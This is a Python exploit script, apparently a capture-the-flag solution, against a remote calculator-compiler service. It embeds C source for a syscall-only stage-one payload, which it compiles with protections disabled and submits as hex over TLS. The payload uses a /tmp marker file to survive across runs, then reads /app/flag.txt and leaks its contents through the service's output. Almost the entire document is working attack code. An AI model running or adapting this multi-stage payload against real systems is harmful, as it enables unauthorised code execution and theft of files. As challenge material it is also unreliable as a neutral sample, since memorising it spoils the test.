#!/usr/bin/env python3
import argparse
import os
import re
import socket
import subprocess
import tempfile

from pwn import remote

STAGE1_C = r'''
typedef unsigned long ulong;

#define SYS_read 0
#define SYS_write 1
#define SYS_close 3
#define SYS_exit 60
#define SYS_getppid 110
#define SYS_openat 257

#define AT_FDCWD -100
#define O_RDONLY 0
#define O_WRONLY 1
#define O_CREAT 64
#define O_TRUNC 512

static unsigned char inbuf[8192];
static unsigned char outbuf[8192];
static int outlen;
static long input_len;
static long input_pos;
static int stack[1024];
static int sp;

static long sc0(long n) {
    long ret;
    __asm__ volatile("syscall"
                     : "=a"(ret)
                     : "a"(n)
                     : "rcx", "r11", "memory");
    return ret;
}

static long sc1(long n, long a) {
    long ret;
    __asm__ volatile("syscall"
                     : "=a"(ret)
                     : "a"(n), "D"(a)
                     : "rcx", "r11", "memory");
    return ret;
}

static long sc3(long n, long a, long b, long c) {
    long ret;
    __asm__ volatile("syscall"
                     : "=a"(ret)
                     : "a"(n), "D"(a), "S"(b), "d"(c)
                     : "rcx", "r11", "memory");
    return ret;
}

static long sc4(long n, long a, long b, long c, long d) {
    register long r10 __asm__("r10") = d;
    long ret;
    __asm__ volatile("syscall"
                     : "=a"(ret)
                     : "a"(n), "D"(a), "S"(b), "d"(c), "r"(r10)
                     : "rcx", "r11", "memory");
    return ret;
}

static void die(int code) {
    sc1(SYS_exit, code);
    for (;;) {
    }
}

static void flush(void) {
    if (outlen > 0) {
        sc3(SYS_write, 1, (long)outbuf, outlen);
        outlen = 0;
    }
}

static void finish(void) {
    flush();
    die(0);
}

static void emit_byte(int value) {
    outbuf[outlen++] = (unsigned char)value;
    if (outlen == (int)sizeof(outbuf)) {
        flush();
    }
}

static int getch(void) {
    if (input_pos >= input_len) {
        finish();
    }
    return inbuf[input_pos++];
}

static int convhex(int c);

static int gethex(void) {
    for (;;) {
        int c = getch();
        if (c <= 0x20) {
            continue;
        }
        if (c == '#') {
            do {
                c = getch();
            } while (c != 0x0a);
            continue;
        }
        return convhex(c);
    }
}

static int convhex(int c) {
    int v = c - 0x30;
    if (v < 0) {
        return gethex();
    }
    if (v >= 0x30) {
        v -= 0x27;
    }
    return v;
}

static void marker_path(char *path) {
    static const char prefix[] = "/tmp/.reflections_";
    long ppid = sc0(SYS_getppid);
    int i = 0;
    int start;
    char tmp[24];
    int n = 0;

    for (; i < (int)sizeof(prefix) - 1; i++) {
        path[i] = prefix[i];
    }

    if (ppid == 0) {
        path[i++] = '0';
    } else {
        while (ppid > 0 && n < (int)sizeof(tmp)) {
            tmp[n++] = (char)('0' + (ppid % 10));
            ppid /= 10;
        }
        for (start = n - 1; start >= 0; start--) {
            path[i++] = tmp[start];
        }
    }
    path[i] = 0;
}

static int marker_exists(void) {
    char path[64];
    long fd;
    marker_path(path);
    fd = sc4(SYS_openat, AT_FDCWD, (long)path, O_RDONLY, 0);
    if (fd >= 0) {
        sc1(SYS_close, fd);
        return 1;
    }
    return 0;
}

static void write_marker(void) {
    char path[64];
    static const char one[] = "1";
    long fd;
    marker_path(path);
    fd = sc4(SYS_openat, AT_FDCWD, (long)path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd >= 0) {
        sc3(SYS_write, fd, (long)one, 1);
        sc1(SYS_close, fd);
    }
}

static void leak_flag(void) {
    static const char flag1[] = "/app/flag.txt";
    static const char flag2[] = "flag.txt";
    static const char fail[] = "NOFLAG";
    unsigned char buf[128];
    long fd = sc4(SYS_openat, AT_FDCWD, (long)flag1, O_RDONLY, 0);

    if (fd < 0) {
        fd = sc4(SYS_openat, AT_FDCWD, (long)flag2, O_RDONLY, 0);
    }
    if (fd < 0) {
        sc3(SYS_write, 1, (long)fail, sizeof(fail) - 1);
        die(0);
    }

    for (;;) {
        long n = sc3(SYS_read, fd, (long)buf, sizeof(buf));
        if (n <= 0) {
            break;
        }
        sc3(SYS_write, 1, (long)buf, n);
    }
    sc1(SYS_close, fd);
    die(0);
}

static int starts_with_magic(void) {
    static const unsigned char magic[] = "REFLECTIONS_STAGE2\n";
    long i;
    if (input_len < (long)sizeof(magic) - 1) {
        return 0;
    }
    for (i = 0; i < (long)sizeof(magic) - 1; i++) {
        if (inbuf[i] != magic[i]) {
            return 0;
        }
    }
    return 1;
}

static long read_all(void) {
    long total = 0;
    for (;;) {
        long n;
        if (total == (long)sizeof(inbuf)) {
            break;
        }
        n = sc3(SYS_read, 0, (long)(inbuf + total), sizeof(inbuf) - total);
        if (n <= 0) {
            break;
        }
        total += n;
    }
    return total;
}

static void output_stage2(void) {
    static const unsigned char script[] = "#!/bin/sh\nexit 0\n";
    sc3(SYS_write, 1, (long)script, sizeof(script) - 1);
    die(0);
}

static void compile_calc(void) {
    for (;;) {
        int c = getch();
        int a;
        int b;

        if (c <= 0x20) {
            continue;
        }
        if (c == '#') {
            do {
                c = getch();
            } while (c != 0x0a);
            continue;
        }
        if (c == '!') {
            stack[sp++] = getch();
            continue;
        }
        if (c == '$') {
            a = gethex();
            b = gethex();
            stack[sp++] = (a << 4) + b;
            continue;
        }
        if (c == '*') {
            b = stack[--sp];
            a = stack[--sp];
            stack[sp++] = a * b;
            continue;
        }
        if (c == '+') {
            b = stack[--sp];
            a = stack[--sp];
            stack[sp++] = a + b;
            continue;
        }
        if (c == '-') {
            b = stack[--sp];
            a = stack[--sp];
            stack[sp++] = a - b;
            continue;
        }
        if (c == '/') {
            b = stack[--sp];
            a = stack[--sp];
            stack[sp++] = a / b;
            continue;
        }
        if (c == '@') {
            emit_byte(stack[--sp]);
            continue;
        }

        a = convhex(c);
        b = gethex();
        emit_byte((a << 4) + b);
    }
}

void _start(void) {
    input_len = read_all();
    input_pos = 0;

    if (starts_with_magic()) {
        write_marker();
        output_stage2();
    }
    if (marker_exists()) {
        leak_flag();
    }

    compile_calc();
}
'''


def build_stage1():
    with tempfile.TemporaryDirectory() as td:
        src = os.path.join(td, "stage1.c")
        out = os.path.join(td, "stage1")
        with open(src, "w", encoding="ascii") as f:
            f.write(STAGE1_C)
        try:
            subprocess.check_call(
                [
                    "gcc",
                    "-nostdlib",
                    "-static",
                    "-Os",
                    "-s",
                    "-ffreestanding",
                    "-fno-builtin",
                    "-fno-stack-protector",
                    "-fno-pic",
                    "-no-pie",
                    "-Wl,--build-id=none",
                    "-o",
                    out,
                    src,
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except FileNotFoundError:
            raise SystemExit("gcc is required to build the stage-one payload")
        except subprocess.CalledProcessError as exc:
            raise SystemExit("gcc failed to build the stage-one payload") from exc
        with open(out, "rb") as f:
            return f.read()


def to_calc_source(blob):
    lines = []
    for i in range(0, len(blob), 16):
        lines.append(" ".join(f"{b:02x}" for b in blob[i : i + 16]))
    return ("\n".join(lines) + "\n").encode()


def recv_all(sock):
    chunks = []
    sock.settimeout(60.0)
    while True:
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)
    return b"".join(chunks)


def exploit(host, port):
    stage1 = build_stage1()
    first = to_calc_source(stage1)
    second = b"REFLECTIONS_STAGE2\n"

    sock = remote(host, port, ssl=True)
    sock.send(first + b"&&" + second + b"&&")
    response = sock.recvall()

    match = re.search(rb"Expected: ([0-9a-f]+)", response)
    if not match:
        print(response.decode("latin-1", errors="replace"))
        raise SystemExit("flag leak was not found in the server response")

    leaked = bytes.fromhex(match.group(1).decode())
    try:
        print(leaked.decode())
    except UnicodeDecodeError:
        print(leaked)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default="127.0.0.1")
    parser.add_argument("port", nargs="?", type=int, default=5000)
    args = parser.parse_args()
    exploit(args.host, args.port)


if __name__ == "__main__":
    main()
